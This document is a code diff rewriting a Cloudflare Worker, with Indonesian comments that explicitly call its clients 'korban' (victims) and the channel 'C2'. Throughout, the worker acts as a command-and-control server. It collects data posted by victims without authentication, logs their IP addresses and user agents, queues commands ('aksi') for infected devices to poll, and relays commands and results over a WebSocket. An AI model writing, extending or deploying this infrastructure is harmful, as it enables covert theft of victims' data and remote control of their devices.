@@ -1,305 +1,360 @@
-// ============================================================
-// 🔥 VERIFIKASI-API - CLOUDFLARE WORKER
-// ============================================================
-
-// SECRET akan diisi dari environment variable PASSWORD
-var SECRET = '';
-
-// Data store in memory (KV fallback)
-var DATA_STORE = {};
+// ================================================================
+// CLOUDFLARE WORKER - verifikasi-api
+// SINKRON 100% DENGAN 3 FILE ACUAN
+// ================================================================
 
 // ============================================================
-// MIDDLEWARE - VERIFIKASI SECRET
+// KONFIGURASI
 // ============================================================
-function verifySecret(request) {
-    const url = new URL(request.url);
-    const password = url.searchParams.get('password') || 
-                     request.headers.get('X-Password') ||
-                     '';
-    return password === SECRET;
+const MAX_DATA = 5000;
+
+// ============================================================
+// CORS HEADERS
+// ============================================================
+const CORS = {
+  'Access-Control-Allow-Origin': '*',
+  'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
+  'Access-Control-Allow-Headers': 'Content-Type',
+  'Access-Control-Max-Age': '86400',
+};
+
+// ============================================================
+// RESPONSE HELPERS
+// ============================================================
+function jsonResponse(data, status = 200) {
+  return new Response(JSON.stringify(data), {
+    status,
+    headers: {
+      'Content-Type': 'application/json',
+      ...CORS,
+    },
+  });
 }
 
 // ============================================================
-// GET /get-password - AMBIL SECRET (TANPA VERIFIKASI!)
+// 🔥 AUTHENTICATION - HANYA 1 PASSWORD!
 // ============================================================
-async function handleGetPassword() {
-    return new Response(JSON.stringify({ 
-        password: SECRET,
-        timestamp: Date.now()
-    }), {
-        headers: { 
-            'Content-Type': 'application/json',
-            'Access-Control-Allow-Origin': '*'
-        }
-    });
-}
-
-// ============================================================
-// POST /data - TERIMA DATA (TANPA SECRET!)
-// ============================================================
-async function handlePostData(request) {
-    try {
-        const data = await request.json();
-        const timestamp = Date.now();
-        
-        // Simpan data
-        const id = timestamp + '_' + (data.sumber || 'unknown');
-        DATA_STORE[id] = {
-            ...data,
-            timestamp: timestamp,
-            id: id
-        };
-        
-        // Limit data store (max 10000)
-        const keys = Object.keys(DATA_STORE);
-        if (keys.length > 10000) {
-            const oldest = keys.slice(0, keys.length - 10000);
-            oldest.forEach(k => delete DATA_STORE[k]);
-        }
-        
-        return new Response(JSON.stringify({ 
-            status: 'ok', 
-            id: id,
-            timestamp: timestamp 
-        }), {
-            headers: { 
-                'Content-Type': 'application/json',
-                'Access-Control-Allow-Origin': '*'
-            }
-        });
-    } catch(e) {
-        return new Response(JSON.stringify({ 
-            status: 'error', 
-            message: e.message 
-        }), {
-            status: 400,
-            headers: { 
-                'Content-Type': 'application/json',
-                'Access-Control-Allow-Origin': '*'
-            }
-        });
-    }
-}
-
-// ============================================================
-// GET /data - AMBIL PERINTAH (PAKAI SECRET!)
-// ============================================================
-async function handleGetData(request) {
-    const url = new URL(request.url);
-    const type = url.searchParams.get('type');
-    
-    // Jika meminta perintah, harus pakai secret
-    if (type === 'perintah') {
-        if (!verifySecret(request)) {
-            return new Response(JSON.stringify({ 
-                status: 'error', 
-                message: 'Unauthorized' 
-            }), {
-                status: 401,
-                headers: { 
-                    'Content-Type': 'application/json',
-                    'Access-Control-Allow-Origin': '*'
-                }
-            });
-        }
-        
-        // Cek apakah ada perintah yang tertunda
-        const pendingCommands = Object.values(DATA_STORE).filter(
-            d => d.sumber === 'command_pending'
-        );
-        
-        if (pendingCommands.length > 0) {
-            const cmd = pendingCommands[0];
-            // Hapus setelah diambil
-            delete DATA_STORE[cmd.id];
-            return new Response(JSON.stringify(cmd.data), {
-                headers: { 
-                    'Content-Type': 'application/json',
-                    'Access-Control-Allow-Origin': '*'
-                }
-            });
-        }
-        
-        // Tidak ada perintah
-        return new Response(JSON.stringify({}), {
-            headers: { 
-                'Content-Type': 'application/json',
-                'Access-Control-Allow-Origin': '*'
-            }
-        });
-    }
-    
-    // GET data tanpa type = ambil semua data (dashboard)
-    if (!verifySecret(request)) {
-        return new Response(JSON.stringify({ 
-            status: 'error', 
-            message: 'Unauthorized' 
-        }), {
-            status: 401,
-            headers: { 
-                'Content-Type': 'application/json',
-                'Access-Control-Allow-Origin': '*'
-            }
-        });
-    }
-    
-    // Ambil semua data untuk dashboard
-    const logs = Object.values(DATA_STORE).sort((a, b) => b.timestamp - a.timestamp);
-    const devices = {};
-    
-    // Hitung devices dari heartbeat
-    logs.filter(d => d.sumber === 'heartbeat' || d.sumber === 'sw_heartbeat' || d.sumber === 'page_heartbeat')
-        .forEach(d => {
-            const id = d.id || d.sumber;
-            if (!devices[id]) {
-                devices[id] = {
-                    lastSeen: d.timestamp,
-                    data: d.data
-                };
-            } else if (d.timestamp > devices[id].lastSeen) {
-                devices[id].lastSeen = d.timestamp;
-                devices[id].data = d.data;
-            }
-        });
-    
-    return new Response(JSON.stringify({
-        logs: logs.slice(0, 500),
-        devices: devices,
-        total: logs.length,
-        timestamp: Date.now()
-    }), {
-        headers: { 
-            'Content-Type': 'application/json',
-            'Access-Control-Allow-Origin': '*'
-        }
-    });
-}
-
-// ============================================================
-// POST /data - SEND COMMAND (PAKAI SECRET!)
-// ============================================================
-async function handlePostCommand(request) {
-    try {
-        const data = await request.json();
-        
-        // Jika ini command, harus pakai secret
-        if (data.aksi) {
-            if (!verifySecret(request)) {
-                return new Response(JSON.stringify({ 
-                    status: 'error', 
-                    message: 'Unauthorized' 
-                }), {
-                    status: 401,
-                    headers: { 
-                        'Content-Type': 'application/json',
-                        'Access-Control-Allow-Origin': '*'
-                    }
-                });
-            }
-            
-            // Simpan sebagai perintah pending
-            const timestamp = Date.now();
-            const id = 'cmd_' + timestamp;
-            DATA_STORE[id] = {
-                sumber: 'command_pending',
-                data: {
-                    ...data,
-                    password: SECRET,
-                    timestamp: timestamp
-                },
-                timestamp: timestamp,
-                id: id
-            };
-            
-            return new Response(JSON.stringify({ 
-                status: 'ok', 
-                command: data.aksi,
-                id: id
-            }), {
-                headers: { 
-                    'Content-Type': 'application/json',
-                    'Access-Control-Allow-Origin': '*'
-                }
-            });
-        }
-        
-        // Data biasa (tanpa secret) - sudah handle di handlePostData
-        return await handlePostData(request);
-        
-    } catch(e) {
-        return new Response(JSON.stringify({ 
-            status: 'error', 
-            message: e.message 
-        }), {
-            status: 400,
-            headers: { 
-                'Content-Type': 'application/json',
-                'Access-Control-Allow-Origin': '*'
-            }
-        });
-    }
-}
-
-// ============================================================
-// OPTIONS - CORS
-// ============================================================
-function handleOptions() {
-    return new Response(null, {
-        headers: {
-            'Access-Control-Allow-Origin': '*',
-            'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
-            'Access-Control-Allow-Headers': 'Content-Type, X-Password',
-            'Access-Control-Max-Age': '86400'
-        }
-    });
+function isAuthenticated(request, env) {
+  const url = new URL(request.url);
+  const key = url.searchParams.get('key') || 
+              request.headers.get('X-API-Key') || 
+              request.headers.get('Authorization')?.replace('Bearer ', '');
+  return key === env.PASSWORD;  // 🔥 HANYA 1 PASSWORD!
 }
 
 // ============================================================
 // MAIN HANDLER
 // ============================================================
 export default {
-    async fetch(request, env) {
-        // Set SECRET dari environment variable
-        SECRET = env.PASSWORD || '';
-        
-        const url = new URL(request.url);
-        const method = request.method;
-        const path = url.pathname;
-        
-        // Handle CORS preflight
-        if (method === 'OPTIONS') {
-            return handleOptions();
-        }
-        
-        // Routing
-        if (path === '/get-password' && method === 'GET') {
-            return handleGetPassword();
-        }
-        
-        if (path === '/data') {
-            if (method === 'GET') {
-                return handleGetData(request);
-            }
-            if (method === 'POST') {
-                // Check if it's a command (has 'aksi' field)
-                try {
-                    const clone = request.clone();
-                    const body = await clone.json();
-                    if (body.aksi) {
-                        return handlePostCommand(request);
-                    }
-                } catch(e) {}
-                return handlePostData(request);
-            }
-        }
-        
-        // 404
-        return new Response('Not Found', {
-            status: 404,
-            headers: { 
-                'Content-Type': 'text/plain',
-                'Access-Control-Allow-Origin': '*'
-            }
-        });
+  async fetch(request, env) {
+    const url = new URL(request.url);
+    const method = request.method;
+    
+    if (method === 'OPTIONS') {
+      return new Response(null, { headers: CORS });
     }
+
+    // ============================================================
+    // 🔥 GET /get-password - KORBAN AMBIL PASSWORD
+    // ============================================================
+    if (url.pathname === '/get-password' && method === 'GET') {
+      const password = env.PASSWORD || '';
+      return jsonResponse({
+        status: 'ok',
+        password: password,  // 🔥 1 PASSWORD!
+        timestamp: Date.now()
+      });
+    }
+
+    // ============================================================
+    // 🔥 POST /data - KORBAN KIRIM DATA (TANPA PASSWORD!)
+    // ============================================================
+    if (url.pathname === '/data' && method === 'POST') {
+      return await handlePostData(request, env);
+    }
+
+    // ============================================================
+    // 🔥 GET /data?type=perintah&password=xxx - SERVER → KORBAN (PAKAI PASSWORD!)
+    // ============================================================
+    if (url.pathname === '/data' && method === 'GET') {
+      return await handleGetData(request, env);
+    }
+
+    // ============================================================
+    // 🔥 WEBSOCKET /ws - PAKAI PASSWORD!
+    // ============================================================
+    if (url.pathname === '/ws') {
+      return handleWebSocket(request, env);
+    }
+
+    // ============================================================
+    // 🔥 HEALTH CHECK /
+    // ============================================================
+    if (url.pathname === '/' && method === 'GET') {
+      const raw = await env.DATA.get('data') || '[]';
+      const data = JSON.parse(raw);
+      return jsonResponse({
+        status: 'ok',
+        version: '2.0.0',
+        timestamp: new Date().toISOString(),
+        totalData: data.length,
+        endpoints: {
+          get_password: '/get-password',
+          post_data: 'POST /data',
+          get_command: 'GET /data?type=perintah&password=xxx',
+          websocket: 'wss://' + url.host + '/ws'
+        }
+      });
+    }
+
+    // 404
+    return jsonResponse({ error: 'Not Found' }, 404);
+  }
 };
+
+// ============================================================
+// 🔥 HANDLER: POST /data (KORBAN → SERVER - TANPA PASSWORD!)
+// ============================================================
+async function handlePostData(request, env) {
+  try {
+    const body = await request.json();
+
+    if (!body || typeof body !== 'object') {
+      return jsonResponse({ error: 'Invalid request body' }, 400);
+    }
+
+    // 🔥 C2 COMMAND (DARI DASHBOARD) - PAKAI PASSWORD!
+    const url = new URL(request.url);
+    const key = url.searchParams.get('key');
+    if (key === env.PASSWORD && (body.sumber === 'c2_command' || body.type === 'c2_command')) {
+      const cmdData = body.data || body;
+      cmdData.timestamp = Date.now();
+      cmdData.status = 'pending';
+      await env.DATA.put('perintah', JSON.stringify(cmdData));
+      return jsonResponse({
+        status: 'ok',
+        type: 'c2',
+        command: cmdData.aksi
+      });
+    }
+
+    // 🔥 DATA DARI KORBAN - TANPA PASSWORD!
+    const d = {
+      waktu: new Date().toISOString(),
+      sumber: body.sumber || body.type || 'unknown',
+      data: body.data || body,
+      ip: request.headers.get('CF-Connecting-IP') || 'unknown',
+      userAgent: request.headers.get('User-Agent') || 'unknown',
+    };
+
+    const raw = await env.DATA.get('data') || '[]';
+    let data = JSON.parse(raw);
+
+    if (data.length >= MAX_DATA) {
+      data = data.slice(-MAX_DATA + 1);
+    }
+
+    data.push(d);
+    await env.DATA.put('data', JSON.stringify(data));
+
+    return jsonResponse({
+      status: 'ok',
+      total: data.length,
+    });
+
+  } catch (error) {
+    return jsonResponse({ error: 'Failed: ' + error.message }, 500);
+  }
+}
+
+// ============================================================
+// 🔥 HANDLER: GET /data (SERVER → KORBAN - PAKAI PASSWORD!)
+// ============================================================
+async function handleGetData(request, env) {
+  const url = new URL(request.url);
+  const type = url.searchParams.get('type');
+  const password = url.searchParams.get('password');
+
+  // 🔥 AMBIL PERINTAH C2 (PAKAI PASSWORD!)
+  if (type === 'perintah') {
+    const correctPassword = env.PASSWORD || '';
+
+    // 🔥 VERIFIKASI PASSWORD!
+    if (password !== correctPassword) {
+      return jsonResponse({
+        status: 'error',
+        message: 'Invalid password'
+      }, 401);
+    }
+
+    try {
+      const perintah = await env.DATA.get('perintah');
+      if (perintah) {
+        const cmd = JSON.parse(perintah);
+        await env.DATA.delete('perintah');
+
+        // 🔥 KIRIM PERINTAH + PASSWORD (UNTUK VERIFIKASI KORBAN)
+        return jsonResponse({
+          aksi: cmd.aksi,
+          params: cmd.params || {},
+          password: correctPassword,
+          timestamp: Date.now()
+        });
+      }
+      return jsonResponse({});
+    } catch (e) {
+      return jsonResponse({});
+    }
+  }
+
+  // 🔥 GET BIASA - LIHAT DATA (PAKAI PASSWORD!)
+  if (!isAuthenticated(request, env)) {
+    return jsonResponse({ error: 'Access Denied' }, 403);
+  }
+
+  try {
+    const raw = await env.DATA.get('data') || '[]';
+    let data = JSON.parse(raw);
+
+    const source = url.searchParams.get('source');
+    if (source) {
+      data = data.filter(item => item.sumber === source);
+    }
+
+    const search = url.searchParams.get('search');
+    if (search) {
+      const s = search.toLowerCase();
+      data = data.filter(item => JSON.stringify(item).toLowerCase().includes(s));
+    }
+
+    const sort = url.searchParams.get('sort') || 'newest';
+    if (sort === 'newest') {
+      data.sort((a, b) => new Date(b.waktu).getTime() - new Date(a.waktu).getTime());
+    } else if (sort === 'oldest') {
+      data.sort((a, b) => new Date(a.waktu).getTime() - new Date(b.waktu).getTime());
+    }
+
+    return jsonResponse(data);
+
+  } catch (e) {
+    return jsonResponse([]);
+  }
+}
+
+// ============================================================
+// 🔥 HANDLER: WEBSOCKET /ws (PAKAI PASSWORD!)
+// ============================================================
+async function handleWebSocket(request, env) {
+  const upgradeHeader = request.headers.get('Upgrade');
+  if (!upgradeHeader || upgradeHeader !== 'websocket') {
+    return new Response('Expected Upgrade: websocket', { status: 426 });
+  }
+
+  const webSocketPair = new WebSocketPair();
+  const [client, server] = Object.values(webSocketPair);
+  server.accept();
+
+  let authenticated = false;
+  let deviceId = 'unknown';
+
+  server.addEventListener('message', async (event) => {
+    try {
+      const data = JSON.parse(event.data);
+
+      // ============================================================
+      // 🔥 AUTHENTIKASI - HANYA 1 PASSWORD!
+      // ============================================================
+      if (data.type === 'auth') {
+        const key = data.key || '';
+        const correctPassword = env.PASSWORD || '';
+
+        if (key === correctPassword) {
+          authenticated = true;
+          deviceId = data.deviceId || 'unknown';
+          server.send(JSON.stringify({
+            type: 'auth_success',
+            role: 'device'
+          }));
+          console.log('✅ WS Authenticated:', deviceId);
+        } else {
+          server.send(JSON.stringify({ type: 'auth_failed' }));
+          server.close(1008, 'Auth failed');
+        }
+        return;
+      }
+
+      // 🔥 JIKA BELUM AUTH, TOLAK SEMUA PERMINTAAN
+      if (!authenticated) {
+        server.close(1008, 'Unauthorized');
+        return;
+      }
+
+      // ============================================================
+      // 🔥 COMMAND DARI DASHBOARD → Simpan perintah
+      // ============================================================
+      if (data.type === 'command') {
+        const correctPassword = env.PASSWORD || '';
+        const cmdData = data.command || {};
+        cmdData.timestamp = Date.now();
+        cmdData.status = 'pending';
+        cmdData.password = correctPassword;
+        
+        await env.DATA.put('perintah', JSON.stringify(cmdData));
+        server.send(JSON.stringify({
+          type: 'command_received',
+          command: cmdData.aksi || 'unknown'
+        }));
+        return;
+      }
+
+      // ============================================================
+      // 🔥 DATA DARI KORBAN (TANPA PASSWORD)
+      // ============================================================
+      if (data.type === 'data' || data.type === 'result') {
+        const raw = await env.DATA.get('data') || '[]';
+        let allData = JSON.parse(raw);
+
+        allData.push({
+          waktu: new Date().toISOString(),
+          sumber: data.type === 'result' ? 'c2_result' : 'websocket',
+          data: data.data || data,
+          deviceId: deviceId
+        });
+
+        if (allData.length > MAX_DATA) {
+          allData = allData.slice(-MAX_DATA);
+        }
+
+        await env.DATA.put('data', JSON.stringify(allData));
+        server.send(JSON.stringify({ type: 'saved' }));
+        return;
+      }
+
+      // ============================================================
+      // 🔥 PING/PONG (KEEP-ALIVE)
+      // ============================================================
+      if (data.type === 'ping') {
+        server.send(JSON.stringify({
+          type: 'pong',
+          timestamp: data.timestamp || Date.now()
+        }));
+        return;
+      }
+
+      // DEFAULT - ECHO
+      server.send(JSON.stringify({ type: 'echo', data: data }));
+
+    } catch (e) {
+      server.send(JSON.stringify({ type: 'error', message: e.message }));
+    }
+  });
+
+  server.addEventListener('close', () => {
+    console.log('❌ WS Closed:', deviceId);
+  });
+
+  return new Response(null, {
+    status: 101,
+    webSocket: client,
+  });
+}
